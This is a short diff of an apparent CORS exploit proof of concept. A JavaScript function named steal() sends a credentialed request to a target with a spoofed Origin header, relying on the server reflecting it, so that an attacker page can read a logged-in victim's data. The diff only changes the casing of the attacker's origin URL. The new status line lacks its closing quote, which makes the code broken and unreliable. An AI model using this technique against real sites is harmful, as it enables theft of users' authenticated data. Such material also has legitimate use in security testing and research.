@@ -16,14 +16,14 @@
 
     async function steal() {
       try {
-        status.innerHTML = "Sending Origin: https://shadowarpit.github.io";
+        status.innerHTML = "Sending Origin: https://ShadowArpit.github.io;
 
         const response = await fetch(TARGET, {
           method: 'GET',
           credentials: 'include',
           headers: {
             'Accept': 'application/json',
-            'Origin': 'https://shadowarpit.github.io'  // This gets reflected
+            'Origin': 'https://ShadowArpit.github.io'  // This gets reflected
           }
         });
 
